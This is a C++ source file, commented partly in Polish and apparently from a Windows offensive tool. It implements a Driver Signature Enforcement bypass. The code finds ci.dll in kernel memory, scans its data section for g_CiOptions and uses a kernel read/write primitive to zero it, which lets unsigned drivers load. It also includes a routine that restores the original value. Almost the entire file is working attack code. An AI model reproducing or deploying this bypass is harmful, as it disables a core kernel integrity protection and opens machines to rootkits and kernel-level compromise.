#include "DSEBypass.h"
#include "common.h"

#pragma comment(lib, "ntdll.lib")

// Same structures as in Utils.cpp
typedef struct _SYSTEM_MODULE {
    ULONG_PTR Reserved1;
    ULONG_PTR Reserved2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR ImageName[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

DSEBypass::DSEBypass(std::unique_ptr<kvc>& rtc) : m_rtc(rtc) {}

bool DSEBypass::DisableDSE() noexcept {
    INFO(L"[DSE] Attempting to disable Driver Signature Enforcement...");
    
    // 1-3. Find ci.dll and g_CiOptions (bez zmian)
    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"[DSE] Failed to locate ci.dll");
        return false;
    }
    
    INFO(L"[DSE] ci.dll base: 0x%llX", ciBase.value());
    
    m_ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!m_ciOptionsAddr) {
        ERROR(L"[DSE] Failed to locate g_CiOptions");
        return false;
    }
    
    INFO(L"[DSE] g_CiOptions address: 0x%llX", m_ciOptionsAddr);
    
    auto current = m_rtc->Read32(m_ciOptionsAddr);
    if (!current) {
        ERROR(L"[DSE] Failed to read g_CiOptions");
        return false;
    }
    
    m_originalValue = current.value();
    INFO(L"[DSE] Original g_CiOptions: 0x%08X", m_originalValue);
    
    // ✅ Wyłącz DSE poprzez wyzerowanie
    DWORD newValue = 0x0;  // Najprostsze - wyzeruj wszystko jak EfiDSEFix
    
    if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
        ERROR(L"[DSE] Failed to write g_CiOptions");
        return false;
    }
    
    auto verify = m_rtc->Read32(m_ciOptionsAddr);
    if (!verify || verify.value() != newValue) {
        ERROR(L"[DSE] Verification failed (read back: 0x%08X)", verify ? verify.value() : 0xFFFFFFFF);
        return false;
    }
    
    SUCCESS(L"[DSE] DSE disabled successfully! (0x%08X -> 0x%08X)", m_originalValue, newValue);
    return true;
}

bool DSEBypass::RestoreDSE() noexcept {
    INFO(L"[DSE] Attempting to restore Driver Signature Enforcement...");
    
    // 1-2. Find ci.dll and g_CiOptions (bez zmian)
    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"[DSE] Failed to locate ci.dll");
        return false;
    }
    
    m_ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!m_ciOptionsAddr) {
        ERROR(L"[DSE] Failed to locate g_CiOptions");
        return false;
    }
    
    INFO(L"[DSE] g_CiOptions address: 0x%llX", m_ciOptionsAddr);
    
    auto current = m_rtc->Read32(m_ciOptionsAddr);
    if (!current) {
        ERROR(L"[DSE] Failed to read g_CiOptions");
        return false;
    }
    
    DWORD currentValue = current.value();
    INFO(L"[DSE] Current g_CiOptions: 0x%08X", currentValue);
    
    // ✅ Przywróć oryginalną wartość (zwykle 0x6)
    DWORD newValue = m_originalValue ? m_originalValue : 0x6;  // Fallback do 0x6
    
    if (!m_rtc->Write32(m_ciOptionsAddr, newValue)) {
        ERROR(L"[DSE] Failed to write g_CiOptions");
        return false;
    }
    
    auto verify = m_rtc->Read32(m_ciOptionsAddr);
    if (!verify || verify.value() != newValue) {
        ERROR(L"[DSE] Verification failed");
        return false;
    }
    
    SUCCESS(L"[DSE] DSE restored successfully! (0x%08X -> 0x%08X)", currentValue, newValue);
    return true;
}

std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) noexcept {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        ERROR(L"[DSE] Failed to get ntdll.dll handle");
        return std::nullopt;
    }

    typedef NTSTATUS (WINAPI *NTQUERYSYSTEMINFORMATION)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );

    auto pNtQuerySystemInformation = reinterpret_cast<NTQUERYSYSTEMINFORMATION>(
        GetProcAddress(hNtdll, "NtQuerySystemInformation"));
    
    if (!pNtQuerySystemInformation) {
        ERROR(L"[DSE] Failed to get NtQuerySystemInformation");
        return std::nullopt;
    }

    ULONG bufferSize = 0;
    NTSTATUS status = pNtQuerySystemInformation(
        11, // SystemModuleInformation
        nullptr, 
        0, 
        &bufferSize
    );

    // STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
    if (status != 0xC0000004L) {
        ERROR(L"[DSE] NtQuerySystemInformation failed with status: 0x%08X", status);
        return std::nullopt;
    }

    auto buffer = std::make_unique<BYTE[]>(bufferSize);
    auto modules = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.get());
    
    status = pNtQuerySystemInformation(
        11, // SystemModuleInformation
        modules,
        bufferSize,
        &bufferSize
    );

    if (status != 0) {
        ERROR(L"[DSE] NtQuerySystemInformation failed (2nd call): 0x%08X", status);
        return std::nullopt;
    }

    INFO(L"[DSE] Found %d kernel modules", modules->Count);
    
    // DEBUG: Show first 10 modules
    for (ULONG i = 0; i < modules->Count && i < 10; i++) {
        auto& mod = modules->Modules[i];
        const char* fileName = strrchr(mod.ImageName, '\\');
        if (fileName) fileName++;
        else fileName = mod.ImageName;
        
        DEBUG(L"[DSE] Module %d: %S at 0x%llX", i, fileName, 
              reinterpret_cast<ULONG_PTR>(mod.ImageBase));
    }
    
    // Search for module by name
    for (ULONG i = 0; i < modules->Count; i++) {
        auto& mod = modules->Modules[i];
        
        // ImageName contains full path, file name is at the end
        const char* fileName = strrchr(mod.ImageName, '\\');
        if (fileName) {
            fileName++; // Skip '\'
        } else {
            fileName = mod.ImageName;
        }
        
        if (_stricmp(fileName, moduleName) == 0) {
            ULONG_PTR baseAddr = reinterpret_cast<ULONG_PTR>(mod.ImageBase);
            
            // Check if ImageBase is not NULL
            if (baseAddr == 0) {
                ERROR(L"[DSE] Module %S found but ImageBase is NULL", moduleName);
                continue; // Keep searching
            }
            
            INFO(L"[DSE] Found %S at 0x%llX", moduleName, baseAddr);
            return baseAddr;
        }
    }
    
    ERROR(L"[DSE] Module %S not found in kernel", moduleName);
    return std::nullopt;
}

ULONG_PTR DSEBypass::FindCiOptions(ULONG_PTR ciBase) noexcept {
    INFO(L"[DSE] Searching for g_CiOptions in ci.dll at base 0x%llX", ciBase);
    
    auto dataSection = GetDataSection(ciBase);
    if (!dataSection) {
        ERROR(L"[DSE] Failed to locate data section in ci.dll");
        return 0;
    }
    
    ULONG_PTR dataStart = dataSection->first;
    SIZE_T dataSize = dataSection->second;
    
    INFO(L"[DSE] Scanning section: 0x%llX (size: 0x%llX)", dataStart, dataSize);
    
    // Skanuj całą sekcję
    SIZE_T scanLimit = dataSize;
    DWORD consecutiveFailures = 0;
    
    // ✅ DEBUG - wypisz WSZYSTKIE wartości w sekcji
    INFO(L"[DSE] Dumping all DWORD values in section:");
    for (ULONG_PTR addr = dataStart; addr < dataStart + scanLimit - 4; addr += 4) {
        auto value = m_rtc->Read32(addr);
        
        if (!value) {
            consecutiveFailures++;
            DEBUG(L"[DSE]   0x%llX: [READ FAILED]", addr);
            if (consecutiveFailures > 20) {
                ERROR(L"[DSE] Too many consecutive read failures, aborting");
                return 0;
            }
            continue;
        }
        
        consecutiveFailures = 0;
        DWORD val = value.value();
        
        // Wypisz KAŻDĄ wartość
        DEBUG(L"[DSE]   0x%llX (offset 0x%llX): 0x%08X", addr, addr - ciBase, val);
        
        // Pattern g_CiOptions
        if ((val & 0x6) == 0x6 && val < 0x10000) {
            ULONG_PTR offset = addr - ciBase;
            INFO(L"[DSE] *** FOUND g_CiOptions at: 0x%llX (offset: 0x%llX, value: 0x%08X)", 
                 addr, offset, val);
            return addr;
        }
    }
    
    ERROR(L"[DSE] g_CiOptions not found in section");
    return 0;
}

std::optional<std::pair<ULONG_PTR, SIZE_T>> DSEBypass::GetDataSection(ULONG_PTR moduleBase) noexcept {
    auto dosHeader = m_rtc->Read16(moduleBase);
    if (!dosHeader || dosHeader.value() != 0x5A4D) {
        return std::nullopt;
    }
    
    auto e_lfanew = m_rtc->Read32(moduleBase + 0x3C);
    if (!e_lfanew || e_lfanew.value() > 0x1000) {
        return std::nullopt;
    }
    
    ULONG_PTR ntHeaders = moduleBase + e_lfanew.value();
    
    auto peSignature = m_rtc->Read32(ntHeaders);
    if (!peSignature || peSignature.value() != 0x4550) {
        return std::nullopt;
    }
    
    auto numSections = m_rtc->Read16(ntHeaders + 0x6);
    if (!numSections || numSections.value() > 50) {
        return std::nullopt;
    }
    
    auto sizeOfOptionalHeader = m_rtc->Read16(ntHeaders + 0x14);
    if (!sizeOfOptionalHeader) return std::nullopt;
    
    ULONG_PTR firstSection = ntHeaders + 4 + 20 + sizeOfOptionalHeader.value();
    
    // ✅ DEBUG - wylistuj WSZYSTKIE sekcje
    INFO(L"[DSE] Listing ALL sections in ci.dll:");
    for (WORD i = 0; i < numSections.value(); i++) {
        ULONG_PTR sectionHeader = firstSection + (i * 40);
        
        char name[9] = {0};
        for (int j = 0; j < 8; j++) {
            auto ch = m_rtc->Read8(sectionHeader + j);
            if (ch) name[j] = static_cast<char>(ch.value());
        }
        
        auto virtualSize = m_rtc->Read32(sectionHeader + 0x08);
        auto virtualAddr = m_rtc->Read32(sectionHeader + 0x0C);
        auto characteristics = m_rtc->Read32(sectionHeader + 0x24);
        
        if (virtualSize && virtualAddr && characteristics) {
            DWORD chars = characteristics.value();
            bool writable = (chars & 0x80000000) != 0; // IMAGE_SCN_MEM_WRITE
            
            INFO(L"[DSE]   Section %d: %-8S RVA=0x%06X Size=0x%06X Chars=0x%08X %s", 
                 i, name, virtualAddr.value(), virtualSize.value(), chars,
                 writable ? L"[WRITABLE]" : L"[READ-ONLY]");
        }
    }
    
    // Teraz szukaj sekcji zawierającej offset 0x4E004
    for (WORD i = 0; i < numSections.value(); i++) {
        ULONG_PTR sectionHeader = firstSection + (i * 40);
        
        char name[9] = {0};
        for (int j = 0; j < 8; j++) {
            auto ch = m_rtc->Read8(sectionHeader + j);
            if (ch) name[j] = static_cast<char>(ch.value());
        }
        
        auto virtualSize = m_rtc->Read32(sectionHeader + 0x08);
        auto virtualAddr = m_rtc->Read32(sectionHeader + 0x0C);
        
        if (virtualSize && virtualAddr) {
            DWORD rva = virtualAddr.value();
            DWORD size = virtualSize.value();
            
            // Sprawdź czy offset 0x4E004 jest w tej sekcji
            if (0x4E004 >= rva && 0x4E004 < (rva + size)) {
                INFO(L"[DSE] Section %S contains offset 0x4E004!", name);
                
                return std::make_pair(
                    moduleBase + rva,
                    static_cast<SIZE_T>(size)
                );
            }
        }
    }
    
    ERROR(L"[DSE] No section found containing offset 0x4E004");
    return std::nullopt;
}

bool DSEBypass::IsValidDataPointer(ULONG_PTR moduleBase, ULONG_PTR addr) noexcept {
    // Simplified validation - address should be within module
    return (addr > moduleBase && addr < moduleBase + 0x200000);
}

DWORD DSEBypass::GetWindowsBuild() noexcept {
    OSVERSIONINFOEXW osInfo = { sizeof(osInfo) };
    
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
    
    if (RtlGetVersion) {
        RtlGetVersion((PRTL_OSVERSIONINFOW)&osInfo);
        return osInfo.dwBuildNumber;
    }
    
    return 0;
}